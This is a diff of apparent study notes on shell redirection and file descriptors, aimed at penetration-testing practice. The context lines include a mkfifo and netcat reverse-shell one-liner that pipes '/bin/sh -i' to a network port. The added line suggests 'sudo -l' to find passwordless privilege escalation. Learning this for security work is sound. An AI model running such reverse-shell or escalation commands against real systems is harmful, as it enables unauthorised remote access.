@@ -15,3 +15,5 @@ num> file to redirect the file descriptor to file (read num becomes file) (it is
 exec: allows to open new file descriptors (and execute another command) that can be used for later: Ex: 3 <> path/file
 
 mkfifo name: creates a file descriptor with name "name" (it somewhat behaves as a file): Ex mkfifo pipe1; /bin/sh -i 2>&1 0<pipe1 | nc 127.0.0.1 2020 1>pipe1
+
+Sometimes your user will already have extra priveges you can use, for example having a sudo executable without password: commands: sudo -l
